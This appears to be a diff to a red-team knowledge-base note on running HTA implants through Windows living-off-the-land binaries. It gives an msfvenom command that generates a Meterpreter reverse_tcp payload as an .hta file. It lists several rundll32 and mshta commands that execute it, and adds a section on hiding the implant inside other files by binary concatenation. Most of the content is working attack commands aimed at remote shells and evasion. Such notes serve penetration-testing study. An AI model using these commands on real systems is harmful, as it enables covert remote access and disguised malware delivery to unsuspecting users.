@@ -2,9 +2,9 @@
 
 ## 01 - Generate via `msfvenom`
 
-> [!INFO] Title
-> Contents
-
+> [!INFO] Payload's Limitation
+> It couldn't handle a command execution that exceeded 8192 characters.. Check for more details about [[Command Prompt|command prompt]] (`cmd.exe`).
+ 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f hta-psh -o implant.hta
 ```
@@ -66,13 +66,38 @@ C:\> mshta.exe <drive_letter>:\absolute\path\to\implant.hta
 ### 3.2 - `rundll32.exe`
 
 ```
-C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"
-
 C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"
+
+C:\> rundll32.exe url.dll,FileProtocolHandler "<drive_letter>:\absolute\path\to\implant.hta"
+
+C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\implant.hta"
 
 C:\> rundll32.exe shdocvw.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"
 
-C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\implant.hta"
+C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"
+```
+
+## 04 - Polyglot
+
+> [!TIP]
+> Feel free to experiment around binding any binary file format with `.hta` implant.
+
+Bind the binary files together.
+
+```
+C:\> copy /y /b filename.extension+implant.hta hidden_implant.extension
+```
+
+It's also possible to do this in `wine`.
+
+```
+$ wine cmd.exe /y /c copy /b filename.extension+implant.hta hidden_implant.extension
+```
+
+Then execute it
+
+```
+C:\> mshta.exe %CD%\hidden_implant.extensions
 ```
 
 ---
@@ -80,18 +105,18 @@ C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\implant.hta
 
 ### Backlinks
 
+- [[Rundll32]]
+
 - [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Windows/Manual/Living off the Land]]
 
 ### LOLBAS
 
 - [LOLBAS: Mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
 
-- [LOLBAS: Rundll32](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)
-
 ### Red Team Notes
 
 - [Red Team Notes: MSHTA](https://www.ired.team/offensive-security/code-execution/t1170-mshta-code-execution)
 
-### Bohops
+### Sevagas
 
-- [Bohops: Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement](https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/)
+- [Sevagas: Hacking around HTA files](https://blog.sevagas.com/?Hacking-around-HTA-files)
